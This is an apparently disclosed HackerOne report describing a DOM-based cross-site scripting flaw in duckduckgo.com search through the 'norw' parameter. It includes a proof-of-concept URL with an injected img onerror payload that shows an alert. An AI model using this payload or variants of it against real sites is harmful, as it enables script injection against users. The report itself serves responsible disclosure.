# DOM XSS on duckduckgo.com search

## Report Details
- **Report ID**: 868934
- **URL**: https://hackerone.com/reports/868934
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-05-08T11:43:41.859Z
- **Disclosed**: 2020-06-14T11:37:58.627Z

## Reporter
- **Username**: cujanovic
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: duckduckgo

## Vulnerability Information
Hello, 
The is a DOM XSS vulnerability on https://duckduckgo.com search through the ```norw``` parameter.

PoC URL:  ```https://duckduckgo.com/?q=a&norw="><img src=/ onerror=alert(document.domain)>```

Screenshot: {F820482}

## Impact

The attacker can execute JS code.

## Attachments
- Screen_Shot_2020-05-08_at_13.39.32.png
